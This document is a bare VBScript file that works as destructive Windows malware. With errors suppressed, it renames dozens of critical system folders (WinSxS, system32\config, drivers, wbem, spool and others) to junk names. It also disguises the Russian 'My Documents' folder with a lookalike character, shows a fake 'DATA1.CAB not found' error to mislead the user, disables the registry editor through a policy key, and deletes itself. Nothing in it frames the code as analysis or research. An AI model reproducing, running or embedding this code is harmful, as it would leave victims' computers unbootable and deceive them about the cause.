Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")



str="C:\WINDOWS\AppPatch"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="01"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="01"
end if

str="C:\WINDOWS\Cursors"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="02"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="02"
end if

str="C:\WINDOWS\WinSxS"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="03"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="03"
end if

str="C:\WINDOWS\Debug"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="04"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="04"
end if

str="C:\WINDOWS\Driver Cache"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="05"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="05"
end if

str="C:\WINDOWS\ehome"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="06"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="06"
end if

str="C:\WINDOWS\Minidump"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="07"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="07"
end if


str="C:\WINDOWS\Help"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="08"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="08"
end if


str="C:\WINDOWS\ime"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="09"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="09"
end if



str="C:\WINDOWS\java"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="10"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="10"
end if



str="C:\WINDOWS\Media"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="11"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="11"
end if



str="C:\WINDOWS\system"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="12"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="12"
end if


str="C:\WINDOWS\SoftwareDistribution"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="13"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="13"
end if





str="C:\WINDOWS\system32\config"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="11212"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="11212"
end if

str="C:\WINDOWS\system32\Setup"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="2212"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="2212"
end if

str="C:\WINDOWS\system32\CatRoot2"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="wwr"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="wwr"
end if

str="C:\WINDOWS\system32\drivers"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="dfsdfsdfd"
end if

str="C:\WINDOWS\system32\wbem"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="dfsdfsdfeeeeeeed"
end if


str="C:\WINDOWS\system32\Microsoft"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="dfsdfsdfeeeeeeeddddsdsd"
end if

str="C:\WINDOWS\system32\icsxml"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="dfsdfsdfeeee111eddddsdsd"
end if




For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
set tf=f.getfolder(folder): tf.name="Мoи документы"
End if
next



str="C:\WINDOWS\system32\NtmsData"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="safsdfggfj"
end if

str="C:\WINDOWS\system32\oobe"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="safsdfgg2s2fj"
end if

str="C:\WINDOWS\system32\PreInstall"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="safsdfgg223s2fj"
end if

str="C:\WINDOWS\system32\SoftwareDistribution"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="safsdfgg223s2fj"
end if


str="C:\WINDOWS\system32\CatRoot2"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="safsdfgg223s2wwwwfj"
end if




str="C:\WINDOWS\system32\spool\drivers"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="ppkj2222221"
end if

str="C:\WINDOWS\system32\spool"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="ppkj1"
end if

str="C:\WINDOWS\system32\Com"
if f.fileExists(str)=true then
set file=f.getfile(str)
file.name="dfsfsdfds"
elseif f.folderExists(str)=true then
set fol=f.getfolder(str)
fol.name="ppkj22221"
end if

s.popup "File DATA1.CAB not found", , "Error", 0+16





s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"


f.deletefile WScript.ScriptFullName, true: Wscript.Quit